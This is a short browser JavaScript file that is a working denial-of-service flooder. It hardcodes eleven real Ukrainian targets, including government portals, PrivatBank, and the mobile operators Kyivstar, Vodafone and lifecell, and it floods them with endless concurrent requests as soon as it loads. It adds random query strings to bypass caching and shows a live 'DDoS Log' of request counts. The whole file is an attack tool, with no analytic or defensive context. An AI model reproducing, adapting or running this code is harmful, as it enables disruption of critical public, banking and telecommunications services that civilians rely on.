try {
var targets = {
        'https://diia.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'https://www.ubr.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'http://cis.org.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'http://www.mns.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'http://dpsu.gov.ua/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'http://www.apn-ua.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'http://privatbank.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'https://kyivstar.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'https://www.vodafone.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'https://www.lifecell.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
        'https://ukraine.ua/': { number_of_requests: 0, number_of_errored_responses: 0 }
    }
  
    var statsEl = document.getElementById('stats');

function printStats() {
    statsEl.innerHTML = '<b>DDoS Log:</b><pre>' + JSON.stringify(targets, null, 2) + ''
}
setInterval(printStats, 5);

var CONCURRENCY_LIMIT = 125;
var queue = [];

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood(target) {
    for (var i = 0;; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 2800))
        queue.push(
            fetchWithTimeout(target + rand, {
                timeout: 6000
            })
            .catch((error) => {
                if (error.code === 20 /* ABORT */ ) {
                    return;
                }
                targets[target].number_of_errored_responses++;
                targets[target].error_message = error.message
            })
            .then((response) => {
                if (response && !response.ok) {
                    targets[target].number_of_errored_responses++;
                    targets[target].error_message = response.statusText
                }
                targets[target].number_of_requests++;
            })

        )
    }
}
  
  // Start
  Object.keys(targets).map(flood)
} catch (e) {
    console.log("Time out.")
}
